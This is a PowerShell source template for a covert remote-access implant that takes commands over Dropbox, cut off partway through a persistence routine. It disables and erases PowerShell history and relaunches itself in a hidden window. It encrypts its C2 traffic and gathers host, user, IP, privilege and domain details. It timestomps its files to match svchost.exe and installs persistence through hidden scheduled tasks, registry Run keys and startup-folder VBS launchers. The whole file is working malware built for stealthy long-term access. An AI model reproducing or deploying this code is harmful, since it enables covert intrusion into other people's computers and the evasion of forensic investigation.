param(
    [switch]$Daemon
)

# === TLS 1.2 ENFORCEMENT (required for Dropbox API on PS 5.1) ===
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# === ANTI-FORENSIC MEASURES ===
Set-Variable -Name 'ErrorActionPreference' -Value 'SilentlyContinue'
Set-Variable -Name 'ProgressPreference' -Value 'SilentlyContinue'

# 1. Disable PowerShell history
Set-PSReadLineOption -HistorySaveStyle SaveNothing 2>$null
Remove-Item (Get-PSReadLineOption).HistorySavePath -Force 2>$null
$env:PSDisablePromptColor = 1

# 2. In stageless-plain mode the agent IS the file to persist; capture path before clearing PSCommandPath
if (-not $env:_STUB_PATH) {
    $_sp = $MyInvocation.MyCommand.Path
    if ($_sp) { $env:_STUB_PATH = $_sp }
}

# Clear evidence of download cradle
Remove-Variable -Name 'PSCommandPath' -Force 2>$null

# === DEBUG (compile-time, set by wizard) ===
STUB_DBG_INIT

# === DAEMON MODE ===
if ($Daemon -and -not $v) {
    Write-Log "[DAEMON]: Starting detached process..."
    $scriptPath = $MyInvocation.MyCommand.Definition
    # Use ProcessStartInfo with CreateNoWindow=true to avoid the conhost flash
    # that Start-Process -WindowStyle Hidden produces before the flag is applied.
    $psi = [System.Diagnostics.ProcessStartInfo]::new("powershell.exe")
    $psi.Arguments = "-NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
    $psi.UseShellExecute    = $false
    $psi.CreateNoWindow     = $true
    $psi.WindowStyle        = [System.Diagnostics.ProcessWindowStyle]::Hidden
    $proc = [System.Diagnostics.Process]::Start($psi)
    Write-Log "[DAEMON]: Agent started (PID: $($proc.Id))"
    return
}

# === OAUTH2 CONFIGURATION ===
# (credentials loaded from transport layer)

# === RSA PUBLIC KEY (split and obfuscated) ===
$PK1 = "PLACEHOLDER_PK1"
$PK2 = "PLACEHOLDER_PK2"
$PK3 = "PLACEHOLDER_PK3"
$PK4 = "PLACEHOLDER_PK4"

$PUBLIC_KEY_PEM = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($PK1 + $PK2 + $PK3 + $PK4))
Remove-Variable -Name PK1, PK2, PK3, PK4 -Force

# === SESSION KEY (pre-shared; GCM-wraps aes_key in server→agent commands) ===
# For staged-enc deployments, $env:_SS_K is injected by the stub after decrypting stage2.
$SESSION_KEY = if ($env:_SS_K) { $env:_SS_K } else { "PLACEHOLDER_SESSION_KEY" }
[System.Environment]::SetEnvironmentVariable('_SS_K', $null)

# === DROPBOX CONFIGURATION ===
$FOLDER_PATH = "PLACEHOLDER_FOLDER_PATH"
$INPUT_FILE = "PLACEHOLDER_INPUT_FILE"
$OUTPUT_FILE = "PLACEHOLDER_OUTPUT_FILE"
$HEARTBEAT_FILE = "PLACEHOLDER_HEARTBEAT_FILE"

# === SLEEP CONFIGURATION ===
$BASE_SLEEP = PLACEHOLDER_BASE_SLEEP
$JITTER_PERCENT = PLACEHOLDER_JITTER_PERCENT
$JITTER = [math]::Floor($BASE_SLEEP * $JITTER_PERCENT / 100)

Write-Log "[CONFIG]: Base sleep: ${BASE_SLEEP}s, Jitter: ${JITTER_PERCENT}%"

# === KILL DATE GUARDRAIL ===
$KILL_DATE = "PLACEHOLDER_KILL_DATE"

function Test-KillDateExpired {
    if ([string]::IsNullOrEmpty($KILL_DATE)) { return $false }
    try {
        $kd = [datetime]::ParseExact($KILL_DATE, "yyyy-MM-dd", $null)
        return ([datetime]::Today -ge $kd)
    } catch { return $false }
}

function Invoke-SelfDestruct {
    Write-Log "[KILL DATE]: expiry reached — removing persist and self"
    try { Invoke-PersistRemoveAll } catch {}
    if ($_BLOB_PATH -and (Test-Path $_BLOB_PATH)) { Remove-Item -Force $_BLOB_PATH -ErrorAction SilentlyContinue }
    if ($_sp -and (Test-Path $_sp)) { Remove-Item -Force $_sp -ErrorAction SilentlyContinue }
    exit 0
}


# === CRYPTO HELPER FUNCTIONS ===

function Find-Python {
    foreach ($cmd in @('python3', 'py', 'python')) {
        $p = Get-Command $cmd -ErrorAction SilentlyContinue
        if ($p) { return $p.Source }
    }
    return $null
}
$_PYTHON = Find-Python

# Check if .NET AesGcm is available (requires .NET Core 3.0+ / .NET 5+; absent on .NET Framework 4.x)
$_HAS_AESGCM = $null -ne ([System.Security.Cryptography.AesGcm] -as [type])

# Encrypt plaintext bytes: RSA-OAEP-SHA256 wraps aes_key; AES-256-GCM encrypts payload.
# Returns "base64(wrapped_key):base64(nonce+ct+tag)" or $null on failure.
function Invoke-NativeEncrypt {
    param([byte[]]$PlainBytes, [System.Security.Cryptography.RSA]$RSA)
    if (-not $_HAS_AESGCM) { return $null }
    try {
        $rng    = [System.Security.Cryptography.RandomNumberGenerator]::Create()
        $aesKey = [byte[]]::new(32); $rng.GetBytes($aesKey)
        $nonce  = [byte[]]::new(12); $rng.GetBytes($nonce)
        $rng.Dispose()
        $tag    = [byte[]]::new(16)
        $ct     = [byte[]]::new($PlainBytes.Length)
        $gcm    = [System.Security.Cryptography.AesGcm]::new([byte[]]$aesKey, 16)
        $gcm.Encrypt([byte[]]$nonce, [byte[]]$PlainBytes, $ct, $tag)
        $gcm.Dispose()
        $blob   = [byte[]]::new(12 + $ct.Length + 16)
        [System.Buffer]::BlockCopy($nonce, 0, $blob, 0, 12)
        [System.Buffer]::BlockCopy($ct,    0, $blob, 12, $ct.Length)
        [System.Buffer]::BlockCopy($tag,   0, $blob, 12 + $ct.Length, 16)
        $wrapped = $RSA.Encrypt([byte[]]$aesKey, [System.Security.Cryptography.RSAEncryptionPadding]::OaepSHA256)
        return [Convert]::ToBase64String($wrapped) + ':' + [Convert]::ToBase64String($blob)
    } catch { return $null }
}

# Decrypt server→agent command: GCM(session_key,aes_key) : GCM(aes_key,cmd) : PSS_sig
# Returns plaintext JSON string or $null on any auth/crypto failure.
function Invoke-NativeDecrypt {
    param([string]$Payload, [System.Security.Cryptography.RSA]$RSA, [byte[]]$SessionKey)
    if (-not $_HAS_AESGCM) { return $null }
    try {
        $parts = $Payload.Trim().Split(':')
        if ($parts.Length -lt 3) { return $null }
        $wrapped = [Convert]::FromBase64String($parts[0])
        $blob    = [Convert]::FromBase64String($parts[1])
        $sig     = [Convert]::FromBase64String($parts[2])

        # Verify PSS signature over (wrapped||blob) BEFORE decrypting
        $msg = $wrapped + $blob
        $pss = [System.Security.Cryptography.RSASignaturePadding]::Pss
        if (-not $RSA.VerifyData($msg, $sig, [System.Security.Cryptography.HashAlgorithmName]::SHA256, $pss)) {
            return $null
        }

        # Unwrap aes_key using session_key via AES-256-GCM
        if ($SessionKey.Length -ne 32 -or $wrapped.Length -lt 28) { return $null }
        $w_nonce = [byte[]]($wrapped[0..11])
        $w_tag   = [byte[]]($wrapped[12..27])
        $w_ct    = [byte[]]($wrapped[28..($wrapped.Length - 1)])
        $aesKeyBytes = [byte[]]::new($w_ct.Length)
        $gcm1 = [System.Security.Cryptography.AesGcm]::new([byte[]]$SessionKey, 16)
        $gcm1.Decrypt($w_nonce, $w_ct, $w_tag, $aesKeyBytes)
        $gcm1.Dispose()

        # Decrypt command blob with unwrapped aes_key
        if ($blob.Length -lt 28) { return $null }
        $b_nonce = [byte[]]($blob[0..11])
        $b_tag   = [byte[]]($blob[12..27])
        $b_ct    = [byte[]]($blob[28..($blob.Length - 1)])
        $plain   = [byte[]]::new($b_ct.Length)
        $gcm2    = [System.Security.Cryptography.AesGcm]::new([byte[]]$aesKeyBytes, 16)
        $gcm2.Decrypt($b_nonce, $b_ct, $b_tag, $plain)
        $gcm2.Dispose()
        return [System.Text.Encoding]::UTF8.GetString($plain)
    } catch { return $null }
}

# Python3 fallback — used only when .NET AesGcm is unavailable (PS 5.1 / .NET Framework 4.x)
function Invoke-PythonCrypto {
    param([string]$Code, [string]$Stdin = "")
    if (-not $_PYTHON) { return $null }
    try {
        $enc    = [System.Text.Encoding]::UTF8
        $inBytes = $enc.GetBytes($Stdin)
        $proc   = [System.Diagnostics.Process]::new()
        $proc.StartInfo.FileName               = $_PYTHON
        $proc.StartInfo.UseShellExecute        = $false
        # Use ArgumentList (type-safe, no shell escaping) on .NET 5+; fall back to
        # manually escaped Arguments string on .NET Framework 4.x.
        try {
            $proc.StartInfo.ArgumentList.Add("-c")
            $proc.StartInfo.ArgumentList.Add($Code)
        } catch {
            # ArgumentList not available (.NET Framework 4.x) — escape " in code string
            $escaped = $Code -replace '"', '\"'
            $proc.StartInfo.Arguments = "-c `"$escaped`""
        }
        $proc.StartInfo.RedirectStandardInput  = $true
        $proc.StartInfo.RedirectStandardOutput = $true
        $proc.StartInfo.RedirectStandardError  = $true
        $proc.StartInfo.CreateNoWindow         = $true
        $null = $proc.Start()
        $sw = $proc.StandardInput
        $sw.AutoFlush = $true
        $sw.BaseStream.Write($inBytes, 0, $inBytes.Length)
        $sw.Close()
        $out = $proc.StandardOutput.ReadToEnd()
        $proc.WaitForExit()
        if ($proc.ExitCode -ne 0) { return $null }
        return $out
    } catch { return $null }
}

function Import-RSAPublicKey {
    param([string]$PemContent)

    $pemLines = $PemContent -split "`n" | Where-Object {
        $_ -notmatch "^-----" -and $_.Trim() -ne ""
    }
    $derBytes = [Convert]::FromBase64String(($pemLines -join "").Trim())

    # Try .NET 5+ ImportSubjectPublicKeyInfo first
    try {
        $rsa = [System.Security.Cryptography.RSA]::Create()
        $rsa.ImportSubjectPublicKeyInfo($derBytes, [ref]$null)
        return $rsa
    } catch {
        # Fallback: parse SubjectPublicKeyInfo DER manually (PS 5.1 / .NET Framework)
    }

    # Manual ASN.1 DER parser for SubjectPublicKeyInfo → RSAPublicKey
    $offset = 0

    # Read ASN.1 tag + length, return (length, newOffset)
    # Outer SEQUENCE
    $offset++ # skip tag 0x30
    $len = $derBytes[$offset]; $offset++
    if ($len -band 0x80) {
        $nLenBytes = $len -band 0x7F; $len = 0
        for ($i = 0; $i -lt $nLenBytes; $i++) { $len = ($len -shl 8) + $derBytes[$offset]; $offset++ }
    }

    # AlgorithmIdentifier SEQUENCE - skip it entirely
    $offset++ # skip tag 0x30
    $algoLen = $derBytes[$offset]; $offset++
    if ($algoLen -band 0x80) {
        $nLenBytes = $algoLen -band 0x7F; $algoLen = 0
        for ($i = 0; $i -lt $nLenBytes; $i++) { $algoLen = ($algoLen -shl 8) + $derBytes[$offset]; $offset++ }
    }
    $offset += $algoLen

    # BIT STRING
    $offset++ # skip tag 0x03
    $bsLen = $derBytes[$offset]; $offset++
    if ($bsLen -band 0x80) {
        $nLenBytes = $bsLen -band 0x7F; $bsLen = 0
        for ($i = 0; $i -lt $nLenBytes; $i++) { $bsLen = ($bsLen -shl 8) + $derBytes[$offset]; $offset++ }
    }
    $offset++ # skip unused bits byte (0x00)

    # Inner SEQUENCE (RSAPublicKey)
    $offset++ # skip tag 0x30
    $innerLen = $derBytes[$offset]; $offset++
    if ($innerLen -band 0x80) {
        $nLenBytes = $innerLen -band 0x7F; $innerLen = 0
        for ($i = 0; $i -lt $nLenBytes; $i++) { $innerLen = ($innerLen -shl 8) + $derBytes[$offset]; $offset++ }
    }

    # INTEGER (modulus)
    $offset++ # skip tag 0x02
    $modLen = $derBytes[$offset]; $offset++
    if ($modLen -band 0x80) {
        $nLenBytes = $modLen -band 0x7F; $modLen = 0
        for ($i = 0; $i -lt $nLenBytes; $i++) { $modLen = ($modLen -shl 8) + $derBytes[$offset]; $offset++ }
    }
    # Extract modulus bytes, strip leading 0x00 (ASN.1 sign byte for positive)
    $modStart = $offset
    if ($derBytes[$modStart] -eq 0) { $modStart++; $modLen-- }
    $modulus = New-Object byte[] $modLen
    [Array]::Copy($derBytes, $modStart, $modulus, 0, $modLen)
    $offset = $modStart + $modLen

    # INTEGER (exponent)
    $offset++ # skip tag 0x02
    $expLen = $derBytes[$offset]; $offset++
    if ($expLen -band 0x80) {
        $nLenBytes = $expLen -band 0x7F; $expLen = 0
        for ($i = 0; $i -lt $nLenBytes; $i++) { $expLen = ($expLen -shl 8) + $derBytes[$offset]; $offset++ }
    }
    $expStart = $offset
    if ($derBytes[$expStart] -eq 0) { $expStart++; $expLen-- }
    $exponent = New-Object byte[] $expLen
    [Array]::Copy($derBytes, $expStart, $exponent, 0, $expLen)

    # Import into RSA
    $rsaParams = New-Object System.Security.Cryptography.RSAParameters
    $rsaParams.Modulus = $modulus
    $rsaParams.Exponent = $exponent

    $rsa = New-Object System.Security.Cryptography.RSACryptoServiceProvider
    $rsa.ImportParameters($rsaParams)
    return $rsa
}

function ConvertFrom-HexString {
    param([string]$Hex)
    $bytes = New-Object byte[] ($Hex.Length / 2)
    for ($i = 0; $i -lt $Hex.Length; $i += 2) {
        $bytes[$i / 2] = [Convert]::ToByte($Hex.Substring($i, 2), 16)
    }
    return $bytes
}

$RSA = $null
try { $RSA = Import-RSAPublicKey -PemContent $PUBLIC_KEY_PEM } catch {}
$SESSION_KEY_BYTES = ConvertFrom-HexString $SESSION_KEY
Write-Log "[CRYPTO]: aesgcm=$_HAS_AESGCM python3=$(if ($_PYTHON) { $_PYTHON } else { 'not found' })"
if (-not $_HAS_AESGCM -and -not $_PYTHON) {
    Write-Log "[FATAL]: No crypto available (.NET AesGcm not present and python3 not found)"
    exit 1
}

# === GET INITIAL TOKEN ===
if (-not (Invoke-TransportRefresh)) {
    Write-Log "[FATAL]: Cannot obtain initial token"
    exit 1
}

# === GATHER SYSTEM INFO (once at startup) ===
$SYS_HOSTNAME = $env:COMPUTERNAME
if (-not $SYS_HOSTNAME) { $SYS_HOSTNAME = hostname 2>$null }
$SYS_USER = $env:USERNAME
$SYS_IP = try {
    $s = [Net.Sockets.Socket]::new([Net.Sockets.AddressFamily]::InterNetwork,
         [Net.Sockets.SocketType]::Dgram, [Net.Sockets.ProtocolType]::Udp)
    $s.Connect('8.8.8.8', 80)
    $ip = ($s.LocalEndPoint -as [Net.IPEndPoint]).Address.ToString()
    $s.Close(); $ip
} catch {
    (Get-NetIPAddress -AddressFamily IPv4 -Type Unicast -ErrorAction SilentlyContinue |
     Where-Object { $_.IPAddress -ne '127.0.0.1' } | Select-Object -First 1).IPAddress
}
if (-not $SYS_IP) { $SYS_IP = 'unknown' }
$SYS_IP_EXT = try {
    # 1. Direct public IP on interface (machines with no NAT)
    $pub = Get-NetIPAddress -AddressFamily IPv4 -Type Unicast -ErrorAction SilentlyContinue |
           Where-Object {
               $a = $_.IPAddress
               $a -ne '0.0.0.0' -and
               $a -notmatch '^(10\.|127\.|169\.254\.|192\.168\.)' -and
               -not ($a.StartsWith('172.') -and [int]($a.Split('.')[1]) -in 16..31)
           } | Select-Object -First 1 -ExpandProperty IPAddress
    if ($pub) {
        $pub
    } else {
        $extIp = $null
        # 2. STUN (RFC 5389, pure UDP/19302) - works through NAT, immune to DNS proxies
        if (-not $extIp) {
            try {
                $udp = New-Object System.Net.Sockets.UdpClient
                $udp.Client.ReceiveTimeout = 3000
                $txId = [byte[]]::new(12)
                [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($txId)
                $pkt = [byte[]](0x00,0x01,0x00,0x00,0x21,0x12,0xA4,0x42) + $txId
                $udp.Send($pkt, $pkt.Length, 'PLACEHOLDER_STUN_IP', 19302) | Out-Null
                $ep = [System.Net.IPEndPoint]::new([System.Net.IPAddress]::Any, 0)
                $resp = $udp.Receive([ref]$ep); $udp.Close()
                $i = 20
                while ($i + 4 -le $resp.Length) {
                    $at = ([int]$resp[$i] -shl 8) + $resp[$i+1]
                    $al = ([int]$resp[$i+2] -shl 8) + $resp[$i+3]
                    if ($at -eq 0x0020 -and $al -ge 8 -and $resp[$i+5] -eq 0x01) {
                        $extIp = "$($resp[$i+8] -bxor 0x21).$($resp[$i+9] -bxor 0x12).$($resp[$i+10] -bxor 0xA4).$($resp[$i+11] -bxor 0x42)"
                        break
                    }
                    $i += 4 + $al + $(if ($al % 4) { 4 - ($al % 4) } else { 0 })
                }
            } catch {}
        }
        # 3. Google TXT fallback (may return IPv6 if machine has IPv6 connectivity)
        if (-not $extIp) {
            try {
                $r = Resolve-DnsName -Name 'o-o.myaddr.l.google.com' -Server '8.8.8.8' -Type TXT -ErrorAction Stop
                $txt = ($r | Where-Object { $_.Type -eq 'TXT' } | ForEach-Object { $_.Strings } | Select-Object -First 1) -join ''
                if ($txt) { $extIp = $txt.Trim() }
            } catch {}
        }
        if ($extIp) { [string]$extIp } else { '' }
    }
} catch { '' }
$SYS_ARCH = if ([Environment]::Is64BitOperatingSystem) { "x64" } else { "x86" }
$SYS_OS = "Windows $([Environment]::OSVersion.Version.Major).$([Environment]::OSVersion.Version.Minor) $SYS_ARCH"
$SYS_PRIVS = "user"
try {
    $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($identity)
    if ($principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) { $SYS_PRIVS = "admin" }
} catch {}
$SYS_DOMAIN = try {
    $cs = Get-WmiObject Win32_ComputerSystem -ErrorAction Stop
    if ($cs.PartOfDomain) { [string]$cs.Domain } else { '' }
} catch { '' }
$SYS_BLOB = ''

$AgentStartPath = (Get-Location).Path
$OperatorPath   = (Get-Location).Path
$AgentPID       = $PID.ToString()
$AgentProc      = try { (Get-Process -Id $PID -ErrorAction Stop).Name } catch { "powershell" }
$_HB_SEQ        = 0

# Self-timestomp: align stub file timestamps to svchost.exe (stable OS-install date)
if ($env:_STUB_PATH -and (Test-Path $env:_STUB_PATH -ErrorAction SilentlyContinue)) {
    try {
        $stubFile = [System.IO.FileInfo]$env:_STUB_PATH
        $ref = Get-Item "$env:WINDIR\System32\svchost.exe" -ErrorAction SilentlyContinue
        if (-not $ref) {
            $ref = Get-ChildItem $stubFile.DirectoryName -File -ErrorAction SilentlyContinue |
                   Where-Object { $_.FullName -ne $env:_STUB_PATH } |
                   Sort-Object LastWriteTime | Select-Object -First 1
        }
        if ($ref) {
            $stubFile.CreationTime   = $ref.CreationTime
            $stubFile.LastWriteTime  = $ref.LastWriteTime
            $stubFile.LastAccessTime = $ref.LastAccessTime
        }
    } catch {}
}

Write-Log "[SYSINFO]: $SYS_HOSTNAME | $SYS_USER ($SYS_PRIVS) | $SYS_IP | $SYS_OS"

# ============================================================
# PERSISTENCE ENGINE - multi-technique, modular
# ============================================================
$_PERSIST_DIR          = "$env:APPDATA\Microsoft\PLACEHOLDER_WIN_DIR"
$_PERSIST_TASK_LOGON   = "PLACEHOLDER_WIN_TASK_LOGONCore"
$_PERSIST_TASK_BOOT    = "PLACEHOLDER_WIN_TASK_BOOTCore"
$_PERSIST_REG_VALUE    = "PLACEHOLDER_WIN_REG_VALUE"
$_PERSIST_WMI_FILTER   = "PLACEHOLDER_WIN_REG_VALUEFilter"
$_PERSIST_WMI_CONSUMER = "PLACEHOLDER_WIN_REG_VALUEConsumer"
$_PERSIST_SVC_NAME     = "PLACEHOLDER_WIN_REG_VALUESvc"

# Returns stub name/path/ext based on _STUB_PATH extension
function Get-PersistStub {
    $ext = if ($env:_STUB_PATH) { [IO.Path]::GetExtension($env:_STUB_PATH).ToLower() } else { '.ps1' }
    $name = switch ($ext) { '.exe' { 'PLACEHOLDER_WIN_REG_VALUE.exe' } '.dll' { 'PLACEHOLDER_WIN_REG_VALUE.dll' } default { 'PLACEHOLDER_WIN_REG_VALUE.ps1' } }
    return [PSCustomObject]@{ Ext = $ext; Name = $name; Path = "$_PERSIST_DIR\$name" }
}

# Returns the launch command string for a given stub path and extension.
# For schtasks this is fine as-is (Task Scheduler uses CREATE_NO_WINDOW internally
# when -Hidden is set). For Run keys / startup folder use New-PersistVbsWrapper instead.
function Get-PersistInvocation { param([string]$StubPath, [string]$Ext)
    switch ($Ext) {
        '.exe' { return $StubPath }
        '.dll' { return "$env:WINDIR\System32\rundll32.exe `"$StubPath`",Run" }
        default { return "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$StubPath`"" }
    }
}

# Creates a VBScript launcher alongside the payload that invokes powershell.exe
# with window-style 0 (CREATE_NO_WINDOW) via WScript.Shell.Run — this prevents the
# conhost.exe flash that occurs when the Run key fires powershell.exe directly.
# Returns the VBS path. Only relevant for .ps1 payloads; .exe/.dll do not need it.
function New-PersistVbsWrapper { param([string]$StubPath)
    $vbsPath = [IO.Path]::ChangeExtension($StubPath, '.vbs')
    # VBScript string literals use "" as the escape for a literal quote character.
    # Use a non-expanding here-string (@'...'@) + Replace so that any $ in $StubPath
    # (e.g. UNC admin shares: \\host\C$\...) is never mistaken for a PS variable.
    # On-disk result: CreateObject("WScript.Shell").Run "powershell.exe ... -File ""<path>""", 0, False
    $vbs = (@'
CreateObject("WScript.Shell").Run "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File ""STUB_PATH""", 0, False
'@).Replace('STUB_PATH', $StubPath).Trim()
    [IO.File]::WriteAllText($vbsPath, $vbs, [Text.Encoding]::ASCII)
    try {
        (Get-Item $vbsPath -Force).Attributes = 'Hidden'
        $ref = Get-Item "$env:WINDIR\System32\svchost.exe" -ErrorAction Stop
        $fi  = [IO.FileInfo]$vbsPath
        $fi.CreationTime = $ref.CreationTime; $fi.LastWriteTime = $ref.LastWriteTime; $fi.LastAccessTime = $ref.LastAccessTime
    } catch {}
    return $vbsPath
}

# Copy launcher binary to stealthy path; returns stub object or throws
function Invoke-PersistEnsureBinary {
    # Priority: _STUB_PATH env var → $PSCommandPath (script-scoped automatic variable)
    $src = $env:_STUB_PATH
    if ([string]::IsNullOrEmpty($src) -or -not (Test-Path $src -ErrorAction SilentlyContinue)) {
        $src = $PSCommandPath
        if ([string]::IsNullOrEmpty($src) -or -not (Test-Path $src -ErrorAction SilentlyContinue)) {
            throw "Cannot locate agent binary to persist (_STUB_PATH=$($env:_STUB_PATH) not found, PSCommandPath also unavailable)"
        }
        $env:_STUB_PATH = $src
    }
    $s = Get-PersistStub
    if (-not (Test-Path $_PERSIST_DIR)) { New-Item -ItemType Directory -Path $_PERSIST_DIR -Force | Out-Null }
    if (-not (Test-Path $s.Path)) {
        Copy-Item -Path $src -Destination $s.Path -Force -ErrorAction Stop
        (Get-Item $s.Path -Force).Attributes = 'Hidden'
        try {
            $ref = Get-Item "$env:WINDIR\System32\svchost.exe" -ErrorAction Stop
            $fi = [IO.FileInfo]$s.Path
            $fi.CreationTime = $ref.CreationTime; $fi.LastWriteTime = $ref.LastWriteTime; $fi.LastAccessTime = $ref.LastAccessTime
            $di = [IO.DirectoryInfo]$_PERSIST_DIR
            $di.CreationTime = $ref.CreationTime; $di.LastWriteTime = $ref.LastWriteTime; $di.LastAccessTime = $ref.LastAccessTime
        } catch {}
    }
    return $s
}

function _IsAdmin { ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) }

# ── Technique: schtask-logon (user-priv, logon) ──────────────
function Invoke-PersistProbe-SchtaskLogon {
    $t = Get-ScheduledTask -TaskName $_PERSIST_TASK_LOGON -ErrorAction SilentlyContinue
    $s = Get-PersistStub; $stub = Test-Path $s.Path
    $st = if ($t -and $stub) { "installed" } elseif ($t -or $stub) { "partial" } else { "available" }
    return "PROBE:schtask-logon:${st}:user:Scheduled Task at logon - fires at user logon"
}
function Invoke-PersistInstall-SchtaskLogon {
    try {
        $s = Invoke-PersistEnsureBinary
        $action = switch ($s.Ext) {
            '.exe' { New-ScheduledTaskAction -Execute $s.Path }
            '.dll' { New-ScheduledTaskAction -Execute "$env:WINDIR\System32\rundll32.exe" -Argument "`"$($s.Path)`",Run" }
            default { New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$($s.Path)`"" }
        }
        $trigger   = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME
        $settings  = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit 0
        $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive -RunLevel Limited
        Register-ScheduledTask -TaskName $_PERSIST_TASK_LOGON -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Force -ErrorAction Stop | Out-Null
        return "OK: schtask-logon installed`n  Task: $_PERSIST_TASK_LOGON`n  Payload: $($s.Path)`n  Trigger: user logon`nARTIFACT:persist_payload:$($s.Path)`nARTIFACT:persist_task:$_PERSIST_TASK_LOGON"
    } catch { return "ERROR: schtask-logon - $($_.Exception.Message)" }
}
function Invoke-PersistRemove-SchtaskLogon {
    Unregister-ScheduledTask -TaskName $_PERSIST_TASK_LOGON -Confirm:$false -ErrorAction SilentlyContinue
    $s = Get-PersistStub; Remove-Item $s.Path -Force -ErrorAction SilentlyContinue
    Remove-Item $_PERSIST_DIR -Force -Recurse -ErrorAction SilentlyContinue
    return "OK: schtask-logon removed`nARTIFACT_REMOVED:persist_payload:$($s.Path)`nARTIFACT_REMOVED:persist_task:$_PERSIST_TASK_LOGON"
}
function Invoke-PersistStatus-SchtaskLogon {
    $t = Get-ScheduledTask -TaskName $_PERSIST_TASK_LOGON -ErrorAction SilentlyContinue
    $s = Get-PersistStub; $stub = Test-Path $s.Path
    if ($t -and $stub) { return "ACTIVE: schtask-logon`n  Task: $_PERSIST_TASK_LOGON`n  Payload: $($s.Path)" }
    if ($t -or $stub)  { return "PARTIAL: schtask-logon`n  Task: $(if($t){'registered'}else{'MISSING'})`n  Payload: $(if($stub){$s.Path}else{'MISSING'})" }
    return "NOT INSTALLED: schtask-logon"
}

# ── Technique: registry-run (user-priv, logon) ───────────────
function Invoke-PersistProbe-RegistryRun {
    $val = (Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $_PERSIST_REG_VALUE -ErrorAction SilentlyContinue).$_PERSIST_REG_VALUE
    $s = Get-PersistStub; $stub = Test-Path $s.Path
    $st = if ($val -and $stub) { "installed" } elseif ($val -or $stub) { "partial" } else { "available" }
    return "PROBE:registry-run:${st}:user:HKCU Run key - fires at user logon"
}
function Invoke-PersistInstall-RegistryRun {
    try {
        $s = Invoke-PersistEnsureBinary
        if ($s.Ext -eq '.ps1') {
            # Use a VBScript wrapper so the Run key fires wscript.exe (no console window)
            # instead of powershell.exe directly (which flashes a conhost window before
            # -WindowStyle Hidden is processed).
            $vbs = New-PersistVbsWrapper -StubPath $s.Path
            $inv = "$env:WINDIR\System32\wscript.exe //B `"$vbs`""
            Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $_PERSIST_REG_VALUE -Value $inv -ErrorAction Stop
            return "OK: registry-run installed`n  Key: HKCU\...\Run\$_PERSIST_REG_VALUE`n  Command: $inv`nARTIFACT:persist_payload:$($s.Path)`nARTIFACT:persist_vbs:$vbs`nARTIFACT:persist_reg:HKCU\...\Run\$_PERSIST_REG_VALUE"
        } else {
            $inv = Get-PersistInvocation -StubPath $s.Path -Ext $s.Ext
            Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $_PERSIST_REG_VALUE -Value $inv -ErrorAction Stop
            return "OK: registry-run installed`n  Key: HKCU\...\Run\$_PERSIST_REG_VALUE`n  Command: $inv`nARTIFACT:persist_payload:$($s.Path)`nARTIFACT:persist_reg:HKCU\...\Run\$_PERSIST_REG_VALUE"
        }
    } catch { return "ERROR: registry-run - $($_.Exception.Message)" }
}
function Invoke-PersistRemove-RegistryRun {
    Remove-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $_PERSIST_REG_VALUE -Force -ErrorAction SilentlyContinue
    $s = Get-PersistStub
    Remove-Item ([IO.Path]::ChangeExtension($s.Path, '.vbs')) -Force -ErrorAction SilentlyContinue
    Remove-Item $s.Path -Force -ErrorAction SilentlyContinue
    Remove-Item $_PERSIST_DIR -Force -Recurse -ErrorAction SilentlyContinue
    return "OK: registry-run removed`nARTIFACT_REMOVED:persist_reg:HKCU\...\Run\$_PERSIST_REG_VALUE`nARTIFACT_REMOVED:persist_vbs:$([IO.Path]::ChangeExtension($s.Path, '.vbs'))`nARTIFACT_REMOVED:persist_payload:$($s.Path)"
}
function Invoke-PersistStatus-RegistryRun {
    $val = (Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $_PERSIST_REG_VALUE -ErrorAction SilentlyContinue).$_PERSIST_REG_VALUE
    if ($val) { return "ACTIVE: registry-run`n  Value: $val" }
    return "NOT INSTALLED: registry-run"
}

# ── Technique: startup-folder (user-priv, logon) ─────────────
function Invoke-PersistProbe-StartupFolder {
    $s = Get-PersistStub
    $startupDir = [Environment]::GetFolderPath('Startup')
    $dest = if ($s.Ext -eq '.ps1') { "$startupDir\$([IO.Path]::GetFileNameWithoutExtension($s.Name)).vbs" } else { "$startupDir\$($s.Name)" }
    $st = if (Test-Path $dest) { "installed" } else { "available" }
    return "PROBE:startup-folder:${st}:user:Startup folder - fires at user logon"
}
function Invoke-PersistInstall-StartupFolder {
    try {
        $s = Invoke-PersistEnsureBinary
        $startupDir = [Environment]::GetFolderPath('Startup')
        if ($s.Ext -eq '.ps1') {
            # Place a VBScript in the Startup folder; Explorer launches .vbs via wscript.exe
            # (WINDOWS subsystem, no console) with window-style 0, preventing the conhost flash
            # that occurs when Explorer ShellExecutes a .ps1 directly.
            $vbs  = New-PersistVbsWrapper -StubPath $s.Path
            $dest = "$startupDir\$([IO.Path]::GetFileNameWithoutExtension($s.Name)).vbs"
            Copy-Item -Path $vbs -Destination $dest -Force -ErrorAction Stop
